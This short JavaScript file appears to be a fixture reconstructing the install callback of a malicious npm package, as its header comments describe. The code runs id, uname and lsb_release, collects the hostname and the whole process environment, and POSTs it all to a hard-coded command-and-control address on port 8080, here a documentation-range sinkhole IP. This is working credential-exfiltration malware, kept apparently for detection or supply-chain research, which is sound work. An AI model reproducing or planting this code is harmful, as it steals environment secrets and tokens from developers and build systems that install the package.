// Reconstruction of @design-system-coopeuch/web@999.0.4 cb.js (2026-05-13).
// Pattern: linux-fingerprint via id/uname/lsb_release then exfil to direct
// IP (no DNS resolution, no OAST cover). RFC 5737 sinkhole in the fixture.
const http = require("http");
const os = require("os");
const { execSync } = require("child_process");

const C2 = "203.0.113.99";

let fp = "";
try { fp += "id=" + execSync("id").toString(); } catch (e) {}
try { fp += " uname=" + execSync("uname -a").toString(); } catch (e) {}
try { fp += " lsb=" + execSync("lsb_release -a").toString(); } catch (e) {}

const body = JSON.stringify({
  host: os.hostname(),
  fp: fp,
  env: process.env
});

const req = http.request({ host: C2, port: 8080, method: "POST", path: "/cb" }, () => {});
req.on("error", () => {});
req.write(body);
req.end();
